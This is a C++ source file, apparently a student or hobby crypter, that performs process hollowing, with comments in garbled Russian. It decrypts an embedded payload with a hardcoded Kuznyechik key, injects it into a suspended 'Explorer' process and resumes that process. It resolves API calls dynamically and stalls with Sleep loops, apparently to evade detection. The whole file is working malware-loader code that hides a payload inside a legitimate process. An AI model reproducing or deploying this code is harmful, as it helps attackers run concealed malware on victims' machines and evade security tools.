// ProcessHollowing.cpp : Defines the entry point for the console application.
//



#include "stdafx.h"
#include <windows.h>
#include "internals.h"
#include "pe.h"
#include "KuznyechikPH.cpp"
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <winnt.h>
#include <thread>
#include <algorithm>
#include <functional>
#include "resource.h"
#include "winres.h"
#include "Winuser.h"

string GenerateKey(ByteBlock init, bool flag) {
	ByteBlock key;
	if (flag) {
		for (int i = 0; i <= 4; ++i) {
			for (int counter = 0; counter < 16; ++counter) {
				Sleep(1000);
				int cur_counter = counter * i + counter;
				key[cur_counter] = (init[cur_counter] ^ (((cur_counter + 29)*(cur_counter * 7 + 5)) % 17)) % 16;
				for (int NumStep = 0; NumStep < 256; ++NumStep) {
					Sleep(1000);
					key[cur_counter] += NumStep;
					key[cur_counter] = key[cur_counter] % 16;
				}
			}
		}
	}
	else
	{
		for(int counter = 0; counter < 16; ++counter) {
			Sleep(1000);
			key[counter] = (init[counter] ^ (((counter + 71)*(counter *13 + 1)) % 23)) % 16;
			for (int NumStep = 0; NumStep < 256; ++NumStep) {
				Sleep(1000);
				key[counter] += NumStep;
				key[counter] = key[counter] % 16;
			}
		}
	}

	string StrKey = hex_representation(key);
	return StrKey;
}
	
void CreateHollowedProcess(char* pDestCmdLine, ByteBlock &pBufferCrypt, ByteBlock &Meskey) //процедура создани€ замещЄнного процесса
{
	
	//создаЄм процесс
	printf("Creating process\r\n");
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

	char *NameF= "CreateProcessA";
	LPCSTR NameFunc = NameF;
	HMODULE hKernel32 = GetModuleHandleA("Kernel32");
	FARPROC fpCreateProcessA = GetProcAddress(hKernel32, NameFunc);
	_CreateProcessA CrPrA = (_CreateProcessA)fpCreateProcessA;

	int result = CrPrA
	(
		0,					// lpApplicationName
		pDestCmdLine,		// lpCommandLine
		0,					// lpProcessAttributes
		0,					// lpThreadAttributes
		0,					// bInheritHandles
		CREATE_SUSPENDED,	// dwCreationFlags, Ќужно, чтобы он не был запущен до тех пор, пока мы его не заполним и не проинициализируем
		0,					// lpEnvironment
		0,					// lpCurrentDirectory
		pStartupInfo,		// lpStartupInfo
		pProcessInfo		// lpProcessInformation
	);

	if (!pProcessInfo->hProcess) //провер€ем, действительно ли он был создан
	{
		printf("Error creating process\r\n");
		return;
	}

	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess); // получаем адрес рабочего места

	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress); //получаем указатель на image со всеми необходимыми параметрами

	// дешифруем прин€тый массив байтов
	ByteBlock key = hex_to_bytes("8ab9aabbce3749ff001f86934f55c677fedcba9876543210012da56789abcdef");
	ByteBlock iv = hex_to_bytes("abc4560def1230dacdefeeab94756efa");
	ByteBlock output;
	CFB_Mode<Kuznyechik> decryptor(Kuznyechik(key), iv);
	decryptor.decrypt(pBufferCrypt, output);
	PBYTE pBuffer = new BYTE[output.amount_of_bytes + 1];
	memcpy(pBuffer, output.pBlocks, output.amount_of_bytes);
	pBuffer[output.amount_of_bytes] = 0;

	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

	//очищаем отобраение образа в пам€ти
	printf("Unmapping destination section\r\n");
	// в 3 строках получаем указатель на функцию
	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");				
	_NtUnmapViewOfSection UnmapVOfSec = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;		
	//  –азмаппируем этот указатель pPEB->ImageBaseAddress от созднного процесса
	DWORD dwResult = UnmapVOfSec			
	(
		pProcessInfo->hProcess, 
		pPEB->ImageBaseAddress
	);

	if (dwResult)
	{
		printf("Error unmapping section\r\n");
		return;
	}

	// выдел€ем новый блок пам€ти под образ
	printf("Allocating memory\r\n");

	char *Guf2 = "VirtualAllocEx";
	LPCSTR Guffi2 = Guf2;
	FARPROC fpVirtAlEx = GetProcAddress(hKernel32, Guffi2);
	_VirtualAllocEx VirtAlEx = (_VirtualAllocEx)fpVirtAlEx;

	PVOID pRemoteImage = VirtAlEx
	(
		pProcessInfo->hProcess,						// hProcess
		pPEB->ImageBaseAddress,						// lpAddress pPEB->ImageBaseAddress NULL
		pSourceHeaders->OptionalHeader.SizeOfImage, // dwSize
		MEM_COMMIT | MEM_RESERVE,					// flAllocationType
		PAGE_EXECUTE_READWRITE						// flProtect ()
	);

	if (!pRemoteImage)
	{
		printf("VirtualAllocEx call failed\r\n");
		return;
	}

	//pPEB->ImageBaseAddress = pRemoteImage;
	PPEB pPEB2 = ReadRemotePEB(pProcessInfo->hProcess); // получаем адрес рабочего места

	PLOADED_IMAGE pImage2 = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
	
	//рассчитываем разницу в адресах
	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;

	printf
	(
		"Source image base: 0x%p\r\n"
		"Destination image base: 0x%p\r\n",
		pSourceHeaders->OptionalHeader.ImageBase,
		pPEB->ImageBaseAddress
	);

	printf("Relocation delta: 0x%p\r\n", dwDelta);
	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;	//перезаписываем в заголовок пам€ти нового процесса адрес первоначального
	printf("Writing headers\r\n");
	
	// записываем в область пам€ти первоначального процесса содержимое буфера(данные открытого файла(helloworld.exe))
	char *Guf3 = "WriteProcessMemory";
	LPCSTR Guffi3 = Guf3;
	FARPROC fpWriteProcMem = GetProcAddress(hKernel32, Guffi3);
	_WriteProcessMemory WrProcMem = (_WriteProcessMemory)fpWriteProcMem;

	if (!WrProcMem
	(
		pProcessInfo->hProcess, 				
		pPEB->ImageBaseAddress, 
		pBuffer, 
		pSourceHeaders->OptionalHeader.SizeOfHeaders, 
		0
	))
	{
		printf("Error writing process memory\r\n");
		return;
	}

	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
		printf("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
		if (!WrProcMem
		(
			pProcessInfo->hProcess,										// hProcess
			pSectionDestination,										// lpBaseAddress
			&pBuffer[pSourceImage->Sections[x].PointerToRawData],		// lpBuffer
			pSourceImage->Sections[x].SizeOfRawData,					// nSize
			0															// *nSize
		))
		{
			printf ("Error writing process memory\r\n");
			printf("0x%p\r\n",GetLastError());
			return;
		}
	}	

	char *Guf4 = "ReadProcessMemory";
	LPCSTR Guffi4 = Guf4;
	FARPROC fpReadProcMem = GetProcAddress(hKernel32, Guffi4);
	_ReadProcessMemory ReadProcMem = (_ReadProcessMemory)fpReadProcMem;

	if (dwDelta) // ≈сли delta =0, то и так все ок
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char* pSectionName = ".reloc";		// эти записи игнорим
			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			printf("Rebasing image\r\n");

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData; // берем указатель на массив
			DWORD dwOffset = 0;  // в начале смещение равно 0
			IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];  // получе указатель на структуру, котора€ опиывает данные

			while (dwOffset < relocData.Size) // см рисунок. relocData.Size - размер вектора
			{
				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset]; // берем заголовок

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);
				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset]; // массив блоков

				for (DWORD y = 0; y < dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);   // сдвигаем смещение
					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
					DWORD dwBuffer = 0;
					ReadProcMem   // получаем указатель старый
					(
						pProcessInfo->hProcess, 
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);

					dwBuffer += dwDelta;		// сдвигаем
					BOOL bSuccess = WrProcMem		// записываем
					(
						pProcessInfo->hProcess,
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);
					if (!bSuccess)
					{
						printf("Error writing memory\r\n");
						continue;
					}
				}
			}
			break;
		}


		DWORD dwBreakpoint = 0xCC;

		DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
			pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

#ifdef WRITE_BP
		printf("Writing breakpoint\r\n");

		if (!WrProcMem
			(
			pProcessInfo->hProcess, 
			(PVOID)dwEntrypoint, 
			&dwBreakpoint, 
			4, 
			0
			))
		{
			printf("Error writing breakpoint\r\n");
			return;
		}
#endif

		LPCONTEXT pContext = new CONTEXT();
		pContext->ContextFlags = CONTEXT_INTEGER;

		printf("Getting thread context\r\n");

		char *Guf5 = "GetThreadContext";
		LPCSTR Guffi5 = Guf5;
		FARPROC fpGetThrCont = GetProcAddress(hKernel32, Guffi5);
		_GetThreadContext GetThrCont = (_GetThreadContext)fpGetThrCont;
		
		if (!GetThrCont(pProcessInfo->hThread, pContext))
		{
			printf("Error getting context\r\n");
			return;
		}

		pContext->Eax = dwEntrypoint;			

		printf("Setting thread context\r\n");

		char *Guf6 = "SetThreadContext";
		LPCSTR Guffi6 = Guf6;
		FARPROC fpSetThrCont = GetProcAddress(hKernel32, Guffi6);
		_SetThreadContext SetThrCont = (_SetThreadContext)fpSetThrCont;

		if (!SetThrCont(pProcessInfo->hThread, pContext))
		{
			printf("Error setting context\r\n");
			return;
		}

		printf("Resuming thread\r\n");

		char *Guf7 = "ResumeThread";
		LPCSTR Guffi7 = Guf7;
		FARPROC fpResThread = GetProcAddress(hKernel32, Guffi7);
		_ResumeThread ResThr = (_ResumeThread)fpResThread;
		if (!ResThr(pProcessInfo->hThread))   // «апускаем обновленный процесс, который был изначально Suspend
		{
			printf("Error resuming thread\r\n");
			return;
		}

		printf("Process hollowing complete\r\n");
}

int _tmain(int argc, _TCHAR* argv[])
{
	HRSRC hRes = FindResource(0, MAKEINTRESOURCE(IDR_IDK1), _T("idk"));
	char* Guf = "LoadResource";
	LPCSTR Guffi = Guf;
	HMODULE hKernel32 = GetModuleHandleA("Kernel32");
	FARPROC fpLoadRes = GetProcAddress(hKernel32, Guffi);
	_LoadResource LoadRes = (_LoadResource)fpLoadRes;
	HGLOBAL hData = LoadRes(0, hRes); 
	DWORD dataSize = SizeofResource(0, hRes);
	char* data = new char[dataSize];
	if (NULL != hRes)
	{
		if (NULL != hData)
		{
			data = (char*)LockResource(hData);
		}
	}

	HRSRC hResKey = FindResource(0, MAKEINTRESOURCE(IDR_IDK2), _T("idk"));
	HGLOBAL hDataKey = LoadRes(0, hResKey);
	DWORD dataKeySize = SizeofResource(0, hResKey);
	char* dataKey = new char[dataKeySize];
	if (NULL != hResKey)
	{
		if (NULL != hDataKey)
		{
			dataKey = (char*)LockResource(hDataKey);
		}
	}
	ByteBlock messageKey = ByteBlock((BYTE*)dataKey, dataKeySize);
	ByteBlock message = ByteBlock((BYTE*)data, dataSize);
	
	CreateHollowedProcess("Explorer", message, messageKey);   
	system("pause");
	return 0;
}

